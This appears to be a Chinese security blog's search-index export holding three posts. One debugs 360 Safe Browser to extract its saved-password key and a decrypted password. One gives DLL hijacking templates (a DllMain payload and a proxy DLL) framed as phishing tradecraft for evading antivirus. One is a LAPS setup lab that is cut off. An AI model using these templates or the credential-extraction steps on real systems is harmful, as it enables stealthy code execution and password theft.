<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>动态调试360安全浏览器获取密钥</title>
      <link href="/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/"/>
      <url>/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/</url>
      
        <content type="html"><![CDATA[<h1 id="动态调试360安全浏览器获取密钥"><a href="#动态调试360安全浏览器获取密钥" class="headerlink" title="动态调试360安全浏览器获取密钥"></a>动态调试360安全浏览器获取密钥</h1><p><img src="/img/360SafeBrowser/28edde14-bc20-4f6d-a3e2-90d61e7d4093.png" alt="img"></p><p>按F9开启调试</p><p><img src="/img/360SafeBrowser/c6a9bd27-653c-4000-a59a-d4c427beb610.png" alt="img"></p><p>将启动的所有的异常都忽略，不然总是暂停</p><p><img src="/img/360SafeBrowser/8c02793e-6d28-4749-99b9-e8177b8d016e.png" alt="img"></p><p><img src="/img/360SafeBrowser/3316bb99-5a8b-4834-841d-604786c2b753.png" alt="img"></p><p>这样就不会因为异常暂停了，直接就打开了360安全浏览器</p><p><img src="/img/360SafeBrowser/7521b024-57b7-44e7-bb0b-d79dcafebd5d.png" alt="img"></p><p><img src="/img/360SafeBrowser/3557fbcb-b98e-46f7-8ce6-d834e60deadb.png" alt="img"></p><p>因为浏览器保存了账号密码，刚才打开网站时自动填充了密码，那么这个过程中的字符串肯定都被x32dbg保存着了。于是在所有模块的字符串里搜索password等可能会存在的关键字符串去定位解密的输入点，然后断点调试。</p><p><img src="/img/360SafeBrowser/c6bed575-d28d-4023-96cb-ce236e7cdbcd.png" alt="img"></p><p><img src="/img/360SafeBrowser/1fb574ae-d7de-4794-831b-502fed4d177d.png" alt="img"></p><p>双击跟入，在688C530B下断点，双击右侧空白处可以添加注释</p><p><img src="/img/360SafeBrowser/445b96d4-5bb2-4daa-a54b-973e20e65edf.png" alt="img"></p><p>进入到解密的函数里，可以如下图操作进入，也可以按回车进入</p><p><img src="/img/360SafeBrowser/3418d97e-3f45-4e61-989a-25377abf0687.png" alt="img"></p><p><img src="/img/360SafeBrowser/79eb9701-7f70-40e2-a425-cf15beb5cfeb.png" alt="img"></p><p>然后重新按F9让程序跑完，然后刷新浏览器页面</p><p><img src="/img/360SafeBrowser/6c64d98b-39b9-4ea6-9a06-4b83a59e0e20.png" alt="img"></p><p><img src="/img/360SafeBrowser/744152db-0da6-4aa3-bd6e-cb3b34e0980a.png" alt="img"></p><p>按F8步过调试</p><p><img src="/img/360SafeBrowser/d4b5455f-056f-4b94-9475-d33860c95995.png" alt="img"></p><p>设置断点后，回车跟入</p><p><img src="/img/360SafeBrowser/39514d23-7832-40d8-99a8-58a15a2e863b.png" alt="img"></p><p>设置断点</p><p><img src="/img/360SafeBrowser/be67cb69-a035-4cb0-a5bb-1afc2d5e3c65.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691FE582断点处</p><p><img src="/img/360SafeBrowser/329097e4-5d2a-4e42-94bd-34b238890f4a.png" alt="img"></p><p><img src="/img/360SafeBrowser/ed5eabe2-4954-4101-900c-244cc78b1214.png" alt="img"></p><p><img src="/img/360SafeBrowser/f7375b32-8d09-4e7a-8edf-19fe0bb455d7.png" alt="img"></p><p><img src="/img/360SafeBrowser/fb64a57b-2a95-4afa-8d52-ba1e0c3166fc.png" alt="img"></p><p><img src="/img/360SafeBrowser/0189aff0-2c48-4c04-ad88-89cb09375184.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691F4E7E断点处。一直F8步入调试</p><p><img src="/img/360SafeBrowser/01fa40c0-0c0b-49ff-a0ca-b42330e5ac93.png" alt="img"></p><p>再一次找到了密文解密的点</p><p><img src="/img/360SafeBrowser/e04828cb-e63d-46b4-929f-539b7aeea317.png" alt="img"></p><p><img src="/img/360SafeBrowser/12cd9644-ae02-413a-9818-dc2df507d52a.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691F5328断点处。一直F8步入调试</p><p><img src="/img/360SafeBrowser/b6545905-8973-4e89-ace3-b78df91bc6a1.png" alt="img"></p><pre><code>1560A2E8  01 13 73 0D 78 62 71 32 33 4D 7A 15 78 61 41 5F  ..s.xbq23Mz.xaA_  1560A2F8  52 5F 4D 39 77 06 71 47 38 21 48 1A 4D 0D 78 19  R_M9w.qG8!H.M.x.  1560A308  4E 5E 4F 52 67 0C 53 30 7A 00 00 00 00 00 00 00  N^ORg.S0z.......  </code></pre><p><img src="/img/360SafeBrowser/3fb10444-94b5-439b-8505-add24917c8f8.png" alt="img"></p><p>那么这就有一个问题了，进入到691F5328断点前，其实已经解密了，691F5328只是处理解密后的字符串得到密码。</p><p>回到691F5328断点前寻找解密函数。</p><p><img src="/img/360SafeBrowser/2ec8837d-c531-42ee-bb96-1065e2be8f47.png" alt="img"></p><p><img src="/img/360SafeBrowser/92383bbb-0ae3-4997-8712-b8241f844ba2.png" alt="img"></p><p><img src="/img/360SafeBrowser/99968427-6908-45b0-8cfe-40e74c97a3a4.png" alt="img"></p><p><img src="/img/360SafeBrowser/88c55d5f-96e6-4ba8-beb9-1074ded4ef7a.png" alt="img"></p><p><img src="/img/360SafeBrowser/7699ac5d-dc36-4ff3-b614-97b43079e31b.png" alt="img"><img src="/img/360SafeBrowser/c8a1f11e-fed0-4dac-8f89-7023423e2ef8.png" alt="img"></p><p>这时候突然想到，既然691F50A0是解密的函数，那么密钥可能是从外部传参进来的，那么就不应该再691F50A0里找密钥，而是在691F50A0上面找</p><p><img src="/img/360SafeBrowser/660487aa-9ac7-4627-a060-e21cbb7fa3a7.png" alt="img"></p><pre><code>0E25F104  63 66 36 36 66 62 35 38 66 35 63 61 33 34 38 35  cf66fb58f5ca3485  </code></pre><p><img src="/img/360SafeBrowser/0602fd2f-9ad9-4989-a35d-fac7fd55cd96.png" alt="img"></p><p>判断奇偶得到密码</p><pre><code>sxq3zxARMwq8HMxNOgSz</code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态调试360安全浏览器获取密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之dll劫持（白加黑）</title>
      <link href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/"/>
      <url>/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之dll劫持（白加黑）"><a href="#钓鱼与社工系列之dll劫持（白加黑）" class="headerlink" title="钓鱼与社工系列之dll劫持（白加黑）"></a>钓鱼与社工系列之dll劫持（白加黑）</h1><h2 id="0x00-知识扫盲"><a href="#0x00-知识扫盲" class="headerlink" title="0x00 知识扫盲"></a>0x00 知识扫盲</h2><h3 id="0x00-1-什么是dll？"><a href="#0x00-1-什么是dll？" class="headerlink" title="0x00-1 什么是dll？"></a>0x00-1 什么是dll？</h3><p>​    DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。</p><h3 id="0x00-2-DLL劫持漏洞（DLL-Hijacking-Exploit"><a href="#0x00-2-DLL劫持漏洞（DLL-Hijacking-Exploit" class="headerlink" title="0x00-2 DLL劫持漏洞（DLL Hijacking Exploit"></a>0x00-2 DLL劫持漏洞（DLL Hijacking Exploit</h3><p>​    严格点说，它是通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL的一类漏洞的统称。</p><p>​    DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary来看。熟悉Windows代码的同学都知道，调用LoadLibrary时可以使用DLL的相对路径。这时，系统会按照特定的顺序搜索一些目录，以确定DLL的完整路径。根据MSDN文档的约定，在使用相对路径调用LoadLibrary（同样适用于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的DLL文件（会根据SafeDllSearchMode配置而稍有不同）。</p><p>（参考链接：<a href="https://security.tencent.com/index.php/blog/msg/20）" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/20）</a></p><pre><code>程序所在目录。加载 DLL 时所在的当前目录。系统目录即 SYSTEM32 目录。16位系统目录即 SYSTEM 目录。Windows目录。PATH环境变量中列出的目录</code></pre><h3 id="0x00-3-白加黑"><a href="#0x00-3-白加黑" class="headerlink" title="0x00-3 白加黑"></a>0x00-3 白加黑</h3><p>​    所谓的”白加黑”，笼统来说是”白exe”加”黑dll”，”白exe”是指带有数字签名的正常exe文件，那么”黑dll”当然是指包含恶意代码 的dll文件。病毒借助那些带数字签名且在杀毒软件白名单内的exe程序去加载自己带有恶意代码的dll，便能获得杀毒软件主动防御的自动信任，从而成功 加载到系统中。</p><h2 id="0x01-编译介绍"><a href="#0x01-编译介绍" class="headerlink" title="0x01 编译介绍"></a>0x01 编译介绍</h2><p>Release的exe文件链接的是标准的MFC DLL(Use MFC in a shared or static dll)。这些DLL在安装Windows的时候已经配置，所以这些程序能够在没有安装Visual C++的机器上运行。而Debug版本的exe链接了调试版本的MFC DLL文件，在没有安装Visual C++的机器上不能运行，因为缺相应的DLL，除非选择use static dll when link。</p><p>静态编译：debug状态下：MTd release状态下：MT</p><p>动态编译：debug状态下：MDd release状态下：MD</p><p>动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p><p>所以综上所述，我们选择静态编译，Release！</p><h2 id="0x02-编写一个dll文件"><a href="#0x02-编写一个dll文件" class="headerlink" title="0x02 编写一个dll文件"></a>0x02 编写一个dll文件</h2><p>创建dll项目</p><p><img src="/img/dllHijacking/ddb4c80b-a50f-41f9-8faf-5cbd7a2a93d8.png" alt="img"></p><p><img src="/img/dllHijacking/d0608f5a-729c-4851-8fb9-d12140bb4333.png" alt="img"></p><p><img src="/img/dllHijacking/3bed69d3-d7e2-49df-9a78-f5adac8a7752.png" alt="img"></p><p><img src="/img/dllHijacking/65e5cc4a-397a-453d-b902-9e61ce100734.png" alt="img"></p><p><img src="/img/dllHijacking/d57ad161-432b-44a0-b75e-57033b5ee38d.png" alt="img"></p><p><img src="/img/dllHijacking/fb4c4aff-59f0-4e89-98fa-9c2ae404e8ed.png" alt="img"></p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    MessageBox(NULL,L&quot;_Title_&quot;,L&quot;Hello&quot;,MB_OK);    return;}</code></pre><p><img src="/img/dllHijacking/ad374a13-c7aa-4dc0-9600-0c1ca4c1b97d.png" alt="img"></p><p><img src="/img/dllHijacking/4146bea6-9175-4598-845d-42778d7c7650.png" alt="img"></p><p><img src="/img/dllHijacking/a1879903-5f2e-426c-9169-5ecb77adb0f3.png" alt="img"></p><h2 id="0x03-两种劫持方法"><a href="#0x03-两种劫持方法" class="headerlink" title="0x03 两种劫持方法"></a>0x03 两种劫持方法</h2><h3 id="0x03-1-第一种dll劫持场景：劫持程序运行时加载的未知dll文件"><a href="#0x03-1-第一种dll劫持场景：劫持程序运行时加载的未知dll文件" class="headerlink" title="0x03-1 第一种dll劫持场景：劫持程序运行时加载的未知dll文件"></a>0x03-1 第一种dll劫持场景：劫持程序运行时加载的未知dll文件</h3><p><strong>某个exe程序运行的时候，使用ProcessMonitor监听</strong></p><p><strong>1. result为NAME NOT FOUND，即找不到dll文件（dll文件名为A.dll）。</strong></p><p><strong>2. 该dll文件调用了LoadLibrary函数</strong></p><p><strong>3. 自己编写dll，重命名A.dll。</strong></p><p><strong>4. 重复之前的程序运行过程，就可以劫持</strong></p><p>DllMain里的代码是程序加载dll文件时，可以选择</p><p>1.进程装载DLL。</p><p>2.进程卸载DLL。</p><p>3.DLL在被装载之后创建了新线程。</p><p>4.DLL在被装载之后一个线程被终止了</p><p>这四种情况下执行恶意代码，</p><p>测试dll文件是否可用性，可以执行rundll32 DllMain.dll aaaaaa(随便加函数名) 调用</p><p><strong>一般选择DLL_PROCESS_ATTACH，则进程加载DLL时就会执行恶意代码</strong></p><p><strong>劫持dll的代码模板</strong></p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><img src="/img/dllHijacking/3311b3ad-835d-4eec-825f-65308f0641b8.png" alt="img"></p><p><img src="/img/dllHijacking/97186110-36b5-4b35-8423-0c8cb9dcd733.jpg" alt="img"></p><h3 id="0x03-2-第二种dll劫持场景：劫持-某个功能（例如截图）所调用的dll文件"><a href="#0x03-2-第二种dll劫持场景：劫持-某个功能（例如截图）所调用的dll文件" class="headerlink" title="0x03-2 第二种dll劫持场景：劫持**某个功能（例如截图）所调用的dll文件"></a>0x03-2 第二种dll劫持场景：劫持**某个功能（例如截图）所调用的dll文件</h3><p><strong>某个exe程序运行的时候，监控某个功能（例如截图）所调用的dll文件</strong></p><p><strong>1. 使用CFFExplorer工具查看该dll文件(dll文件名为B)，导入目录里的kerbel32.dll里是否调用了LoadLibrary。</strong></p><p><strong>2. 如果调用了LoadLibrary，则在导出目录找导出的函数名（函数名为C）</strong></p><p><strong>3. 自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll</strong></p><p><strong>4. 运行该程序的某个功能，即可劫持</strong></p><p>代码demo</p><p>extern导出函数的代码可以用rundll32 dllExtern.dll test(函数名) 调用</p><p>extern “C” extern “C”使得在C++中使用C编译方式成为可能。在“C++”下定义“C”函数，需要加extern “C”关键词。用extern “C”来指明该函数使用C编译方式。输出的“C”函数可以从“C”代码里调用</p><p>__declspec(dllexport)的作用就是让编译器按照某种预定的方式（前面大致解释了这种方式的规则）来输出导出函数及变量的符号</p><p><img src="/img/dllHijacking/7acdb63b-b8dc-43c6-a762-efd640138ca5.jpg" alt="img"></p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    WinExec(&quot;calc.exe&quot;, SW_HIDE);    return;}</code></pre><p><img src="/img/dllHijacking/77ce6d79-41a6-4e60-b75e-8c3eb77cd7c6.png" alt="img"></p><p><img src="/img/dllHijacking/fec18db9-81d3-4f05-af6b-5097d3c34bd2.jpg" alt="img"></p><p><strong>劫持dll的代码模板</strong></p><p><strong>假设程序加载的dll名字为B，B.dll的导出函数为C</strong></p><p><strong>劫持的dll名字改为B</strong></p><p><strong>B.dll改为B_Origin.dll</strong></p><p><strong>PrScrn改为C</strong></p><p><strong>PrScrn_Origial.dll改为B_Origin.dll</strong></p><pre><code>#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void PrScrn();BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void PrScrn(){    MessageBox(NULL, L&quot;DLL Hijack! by DLLHijacker!&quot;, L&quot;:)&quot;, 0);  //我们要攻击的恶意代码    HINSTANCE hDllInst = LoadLibrary(L&quot;PrScrn_Origial.dll&quot;);    if (hDllInst)    {        typedef DWORD(WINAPI *EXPFUNC)();        EXPFUNC exportFunc = NULL;        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, &quot;PrScrn&quot;);        if (exportFunc)        {            exportFunc();        }        FreeLibrary(hDllInst);    }    return;}</code></pre><h2 id="0x04-本地dll劫持场景模拟"><a href="#0x04-本地dll劫持场景模拟" class="headerlink" title="0x04 本地dll劫持场景模拟"></a>0x04 本地dll劫持场景模拟</h2><p>模拟一个exe程序调用dll文件，然后用自己的dll去劫持</p><h3 id="0x04-1-创建dll项目，项目名为aaa"><a href="#0x04-1-创建dll项目，项目名为aaa" class="headerlink" title="0x04-1 创建dll项目，项目名为aaa"></a>0x04-1 创建dll项目，项目名为aaa</h3><p>源.cpp</p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    MessageBox(NULL, TEXT(&quot;我是程序运行时正常加载的dll&quot;), TEXT(&quot;hello&quot;), NULL);    return;}</code></pre><p><img src="/img/dllHijacking/56f864e9-d608-4075-a419-b6c909d3dd47.png" alt="img"></p><h3 id="0x04-2-创建一个MFC程序，模拟一个正常的exe去加载dll"><a href="#0x04-2-创建一个MFC程序，模拟一个正常的exe去加载dll" class="headerlink" title="0x04-2 创建一个MFC程序，模拟一个正常的exe去加载dll"></a>0x04-2 创建一个MFC程序，模拟一个正常的exe去加载dll</h3><p><img src="/img/dllHijacking/d6443f71-fc0f-4c41-ae5f-91a92c2c9f6b.png" alt="img"></p><p><img src="/img/dllHijacking/5b9f98d9-2a0b-4437-8dc0-9fed139d3f14.png" alt="img"></p><p>一直下一步直到完成</p><p>从工具箱里托一个按钮</p><p><img src="/img/dllHijacking/5fbb8def-76cc-4e50-aca1-86b5de88c75c.png" alt="img"></p><p>双击按钮，在OnBnClickedButton1函数里添加代码</p><pre><code>void CMFC_aaaDlg::OnBnClickedButton1(){    // TODO: 在此添加控件通知处理程序代码    typedef DWORD (*TEST)();    HINSTANCE hLibrary;    hLibrary = LoadLibrary(TEXT(&quot;aaa.dll&quot;));                // 使用LoadLibrary加载dll    TEST test = (TEST)GetProcAddress(hLibrary, &quot;test&quot;);     // 获取dll文件的函数地址    test();                                                 // 运行函数}</code></pre><p><img src="/img/dllHijacking/7f416a23-0aee-40b4-810f-7df7d1212b25.png" alt="img"></p><p>编译即可。将aaa.dll文件拖到MFC_aaa.exe当前目录下</p><p><img src="/img/dllHijacking/d913a0e7-6a7d-4d77-9762-20d809862adc.png" alt="img"></p><p>运行MFC_aaa.exe，点击Button1，成功加载aaa.dll文件</p><p><img src="/img/dllHijacking/4ba9f664-1864-4ae9-869a-2455c4be222a.png" alt="img"></p><h3 id="0x04-3-模拟劫持未知的dll文件"><a href="#0x04-3-模拟劫持未知的dll文件" class="headerlink" title="0x04-3 模拟劫持未知的dll文件"></a>0x04-3 模拟劫持未知的dll文件</h3><p>当MFC_aaa.exe程序运行的时候，会加载aaa.dll文件。那么当我们用ProcessMonitor去检测，发现aaa.dll文件不存在，并且还调用了LoadLibrary。那么此时就可以劫持。</p><p>环境开始模拟：MFC_aaa.exe当前目录下没有任何dll文件</p><p><img src="/img/dllHijacking/17ddcc92-aea7-45a6-8dae-058134f596e9.png" alt="img"></p><p>使用ProcessMonitor监听</p><p><img src="/img/dllHijacking/3b87a787-0f53-4b06-b552-3dc9f5bc188e.png" alt="img"></p><p><img src="/img/dllHijacking/378b82cb-0553-4596-b266-1b9ce74de8df.png" alt="img"></p><p>运行MFC_aaa.exe，点击button1发现程序加载aaa.dll文件，从当前目录开始查找，但是结果都是没有找到。</p><p>引出一个知识，dll查找路径</p><pre><code>1.程序所在目录。2.加载 DLL 时所在的当前目录。3.系统目录即 SYSTEM32 目录。4.16位系统目录即 SYSTEM 目录。5.Windows目录。6.PATH环境变量中列出的目录</code></pre><p><img src="/img/dllHijacking/84280466-5824-4105-9b90-cf9688e98617.png" alt="img"></p><p>查看aaa.dll的Stack，发现程序是通过LoadLibrary加载的aaa.dll，那么这种情况下就可以做劫持了。</p><p><img src="/img/dllHijacking/00eed3a3-df61-4372-9d5f-7b27928e85c7.png" alt="img"></p><p>开始编写劫持代码，使用DllMain进行劫持，如果劫持成功，就会弹出计算机。</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><img src="/img/dllHijacking/be3d945e-fe59-4f88-87a0-fc7a57fc35af.png" alt="img"></p><p>将编译好的dllInject1.dll重命名为aaa.dll，并放到MFC_aaa.exe同目录下，运行MFC_aaa.exe。</p><p>成功劫持了MFC_aaa.exe运行时加载的dll文件</p><p><img src="/img/dllHijacking/6c2e9028-d472-4bd9-bee5-03f7c5d6ea5c.jpg" alt="img"></p><h3 id="0x04-4-模拟劫持存在的dll文件"><a href="#0x04-4-模拟劫持存在的dll文件" class="headerlink" title="0x04-4 模拟劫持存在的dll文件"></a>0x04-4 模拟劫持存在的dll文件</h3><p>MFC_aaa.exe当前程序目录下面存在aaa.dll文件</p><p><img src="/img/dllHijacking/e2e2fc58-044c-49ba-abf7-8a9520f181e5.png" alt="img"></p><p><img src="/img/dllHijacking/10c2602a-23ae-4006-970c-be2a606c26c5.png" alt="img"></p><p>运行MFC_aaa.exe</p><p><img src="/img/dllHijacking/d5e92963-7ab4-4d3c-8e96-677e14d476fc.png" alt="img"></p><p><img src="/img/dllHijacking/6f918fae-61b2-4349-b7f1-d70ea90ebea3.png" alt="img"></p><p>使用CFFExplorer查看aaa.dll文件</p><p><img src="/img/dllHijacking/f748769f-1a4a-49d8-aa87-2dcdc14a3291.png" alt="img"></p><p><img src="/img/dllHijacking/43cdb258-b27c-4ae2-8838-4a8fbebbfdb2.png" alt="img"></p><p>开始编写劫持代码，使用extern进行劫持，如果劫持成功，就会弹出计算机，并且弹框“DLL Hijack! by DLLHijacker!”</p><pre><code>#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void test(){    MessageBox(NULL, L&quot;DLL Hijack! by DLLHijacker!&quot;, L&quot;:)&quot;, 0);  //我们要攻击的恶意代码    HINSTANCE hDllInst = LoadLibrary(L&quot;aaa_Origial.dll&quot;);    if (hDllInst)    {        typedef DWORD(WINAPI *EXPFUNC)();        EXPFUNC exportFunc = NULL;        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);        if (exportFunc)        {            exportFunc();        }        FreeLibrary(hDllInst);    }    return;}</code></pre><p><img src="/img/dllHijacking/197af274-1b75-4985-8037-6d55819c6834.png" alt="img"></p><p>将编译好的文件放到MFC_aaa.exe同目录下，并且重命名为aaa.dll。原先的aaa.dll重命名为aaa_Origial.dll。</p><p><img src="/img/dllHijacking/c82b5d9a-3dc6-4517-9ad3-741a77185520.png" alt="img"></p><p>运行后成功劫持，弹出计算机和弹框</p><p><img src="/img/dllHijacking/a83deb90-9fbf-4889-a0d1-34cb10037a6e.jpg" alt="img"></p><h2 id="0x05-实战dll劫持"><a href="#0x05-实战dll劫持" class="headerlink" title="0x05 实战dll劫持"></a>0x05 实战dll劫持</h2><p>案例一：音速启动安装时的dll劫持</p><p>监控音速启动调用的dll</p><p><img src="/img/dllHijacking/3361168b-c355-4189-9e1b-5fdea0a18a86.png" alt="img"></p><p>其中一个不存在的dll调用了LoadLibrary</p><p><img src="/img/dllHijacking/24b54885-336d-493c-aca0-6d747ea1c067.png" alt="img"></p><p>编写劫持dll</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p>将dll重命名为Riched20.dll，并放到音速启动程序的同目录下</p><p><img src="/img/dllHijacking/432fff3f-ca3b-4167-b61d-295c7cf8c862.png" alt="img"></p><p>重新运行程序，成功弹出计算机</p><p><img src="/img/dllHijacking/13a96af4-3863-4f38-8a75-41c0bc38bae7.jpg" alt="img"></p><pre><code>存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组策略之LAPS</title>
      <link href="/2020/11/26/zu-ce-lue-zhi-laps/"/>
      <url>/2020/11/26/zu-ce-lue-zhi-laps/</url>
      
        <content type="html"><![CDATA[<h1 id="组策略之Local-Administrator-Password-Solution"><a href="#组策略之Local-Administrator-Password-Solution" class="headerlink" title="组策略之Local Administrator Password Solution"></a>组策略之Local Administrator Password Solution</h1><h2 id="0x00-LAPS介绍"><a href="#0x00-LAPS介绍" class="headerlink" title="0x00 LAPS介绍"></a>0x00 LAPS介绍</h2><p>介绍：</p><pre><code>将本地管理员密码存储在LDAP上，作为计算机账户的一个机密属性，配合GPO，实现自动定期修改密码、设置密码长度、强度等，然后配置某些指的账号，能查看存储的密码，如果用户需要，可以用PowerShell或指的工具查询密码，但对非授权用户，确无法获取，从而实现本机管理员的自动化管理。LAPS使用两个LDAP属性来存储本地管理员凭证，这两个属性分别是ms-MCS-AdmPwd（存储密码）和ms-MCS-AdmPwdExpirationTime（存储过期时间）。</code></pre><p>功能：</p><pre><code>如果配置不当，我们可以在域内一台普通主机，查看域内其他主机本地管理员账号LAPS解决方案的核心是GPO客户端扩展（CSE），它执行以下任务，并可以在GPO更新期间执行以下操作：检查本地Administrator帐户的密码是否已过期。当旧密码过期或需要在过期之前进行更改时，生成新密码。根据密码策略验证新密码。将密码报告给Active Directory，并将密码和机密属性一起存储在Active Directory中。将密码的下一个到期时间报告给Active Directory，并将该属性与计算机帐户的属性一起存储在Active Directory中。更改管理员帐户的密码。然后，允许这样做的用户可以从Active Directory中读取密码。合格的用户可以请求更改计算机的密码。计算机帐户只能写入/更新自己的本地管理员帐户密码（ms-Mcs-AdmPwd属性），而不能从该属性读取密码。可以轻松地为OU中的每台计算机更改密码。</code></pre><p>展示：</p><pre><code>laps再ldap的属性里：      ms-MCS-AdmPwd：存储密码      ms-MCS-AdmPwdExpirationTime：存储过期时间</code></pre><p>靶场环境介绍：</p><pre><code>测试环境:组织 OU：lapsComputers            MOTOO-IISWEB$           域机器组织 OU：lapsAdminUsers            lidan                   域用户组 group： lapsAdmins            lidan                   用户</code></pre><h2 id="0x01-域控创建组织lapsComputers和laspAdminUsers"><a href="#0x01-域控创建组织lapsComputers和laspAdminUsers" class="headerlink" title="0x01 域控创建组织lapsComputers和laspAdminUsers"></a>0x01 域控创建组织lapsComputers和laspAdminUsers</h2><p>创建组织OU</p><p><img src="/img/laps/06be0350-b9fc-4f70-8251-4b1943e29e92.png" alt="img"></p><p><img src="/img/laps/267ccd8a-efc5-482b-887f-206860d1d593.png" alt="img"></p><p><img src="/img/laps/afdccd17-1fb6-494a-abd1-c099e12466c5.png" alt="img"></p><p>成功将Motoo-IISWEB域机器加入到lapsComputers组织里</p><p><img src="/img/laps/a3cfe6ee-031e-43c0-9033-57aadea88a6d.png" alt="img"></p><p><img src="/img/laps/36550d89-2bfc-4a81-bd53-68e589320c10.png" alt="img"></p><p>同样创建组织OU：lapsAdminUsers</p><p>创建组：lapsAdmins</p><p>将liidan域用户加入到组织OU：lapsAdminUsers里，并且加入到组lapsAdmins</p><p><img src="/img/laps/88c58275-6c1e-44bd-8bc5-a9a205ea98c5.png" alt="img"></p><p>通过net user lidan /do可以看到在lapsAdmins组里</p><p><img src="/img/laps/40976aa6-3d48-43e1-b794-b3064c64010d.png" alt="img"></p><h2 id="0x02-安装LAPS"><a href="#0x02-安装LAPS" class="headerlink" title="0x02 安装LAPS"></a>0x02 安装LAPS</h2><p>域控安装laps</p><p><img src="/img/laps/c464ad27-67dc-42ec-9cd1-a77dcf5e68c9.png" alt="img"></p><p><img src="/img/laps/ffc755e3-cdc8-437f-814b-9d516ee3c6a1.png" alt="img"></p><p>扩展AD的架构</p><p>windows2008 的powershell版本是2.0，需要更新到3.0。才能导入Admpwd.ps</p><pre><code>Import-module AdmPwd.PSUpdate-AdmPwdADSchema</code></pre><p>使用Update-AdmPwdADSchema扩展架构</p><p><img src="/img/laps/cb3524f3-5066-4ac4-9368-28a2ee89be40.png" alt="img"></p><p>从活动目录中可以看到多出了这两个属性</p><p><img 